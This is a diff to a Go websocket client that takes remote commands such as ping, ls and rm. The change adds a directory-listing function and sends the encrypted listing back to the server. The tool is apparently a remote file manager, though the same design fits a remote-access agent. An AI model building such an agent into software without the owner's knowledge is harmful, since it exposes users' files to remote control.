@@ -8,6 +8,8 @@ import (
 	"net/url"
 	"os"
 	"os/signal"
+	"path/filepath"
+	"sort"
 	"strings"
 	"time"
 
@@ -26,6 +28,7 @@ type TransferChunk struct {
 	TransferId string             `json:"id"`
 	Chunkrange TransferChunkRange `json:"r"`
 	Content    []byte             `json:"c"`
+	Type       string             `json:"type"`
 }
 
 type Command struct {
@@ -44,22 +47,26 @@ type LSResponseEntry struct {
 type UploadResponse struct {
 	TransferId string `json:"id"`
 	Success    bool   `json:"s"`
+	Type       string `json:"type"`
 }
 
 type LSResponse struct {
 	Success bool              `json:"s"`
 	Path    string            `json:"p"`
 	Entries []LSResponseEntry `json:"e"`
+	Type    string            `json:"type"`
 }
 
 type GETResponse struct {
 	Success    bool   `json:"s"`
 	Name       string `json:"n"`
 	TransferId string `json:"id"`
+	Type       string `json:"type"`
 }
 
 type GenericResponse struct {
-	Success bool `json:"s"`
+	Success bool   `json:"s"`
+	Type    string `json:"type"`
 }
 
 func generateRandomString(length int) string {
@@ -76,6 +83,72 @@ func generateRandomString(length int) string {
 func connect(u url.URL) (*websocket.Conn, error) {
 	c, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
 	return c, err
+}
+
+func ListDirectory(dirPath string) LSResponse {
+	absPath, err := filepath.Abs(filepath.Clean(dirPath))
+	if err != nil {
+		absPath = dirPath // fallback
+	}
+
+	resp := LSResponse{
+		Success: false,
+		Path:    absPath,
+		Entries: []LSResponseEntry{},
+		Type:    "ls",
+	}
+
+	// Check if exists and is directory
+	info, err := os.Stat(absPath)
+	if err != nil {
+		return resp
+	}
+	if !info.IsDir() {
+		return resp
+	}
+
+	entries, err := os.ReadDir(absPath)
+	if err != nil {
+		return resp
+	}
+
+	resp.Entries = make([]LSResponseEntry, 0, len(entries))
+
+	for _, entry := range entries {
+		name := entry.Name()
+		if name == "." || name == ".." {
+			continue
+		}
+
+		isDir := entry.IsDir()
+		var size int64 = 0
+
+		if !isDir {
+			if info, err := entry.Info(); err == nil {
+				size = info.Size()
+			}
+		}
+
+		resp.Entries = append(resp.Entries, LSResponseEntry{
+			Name:   name,
+			Folder: isDir,
+			Size:   size,
+		})
+	}
+
+	// Sort
+	sort.Slice(resp.Entries, func(i, j int) bool {
+		a, b := resp.Entries[i], resp.Entries[j]
+
+		if a.Folder != b.Folder {
+			return a.Folder
+		}
+
+		return strings.ToLower(a.Name) < strings.ToLower(b.Name)
+	})
+
+	resp.Success = true
+	return resp
 }
 
 func main() {
@@ -149,7 +222,7 @@ func main() {
 			}
 
 			if com.Command == "ping" {
-				log.Printf(prefix+"Received ping from %s", com.Target)
+				log.Printf(prefix + "Received ping")
 				continue
 			}
 
@@ -158,7 +231,23 @@ func main() {
 					log.Printf(prefix + "Missing path for ls")
 				}
 				log.Printf(prefix+"Received ls command for %s", com.Target)
+				resp := ListDirectory(com.Target)
+				jsonresp, err := json.Marshal(resp)
 
+				if err != nil {
+					fmt.Println(prefix+"Error while marshalling ls response:", err)
+				}
+				fmt.Println(string(jsonresp))
+
+				encrypted, err := Encrypt(jsonresp, key)
+				if err != nil {
+					fmt.Println(prefix+"Error while encrypting ls response:", err)
+				}
+
+				err = c.WriteMessage(websocket.BinaryMessage, encrypted)
+				if err != nil {
+					log.Println(prefix+"Error while writing ls response:", err)
+				}
 			}
 
 			if com.Command == "rm" {
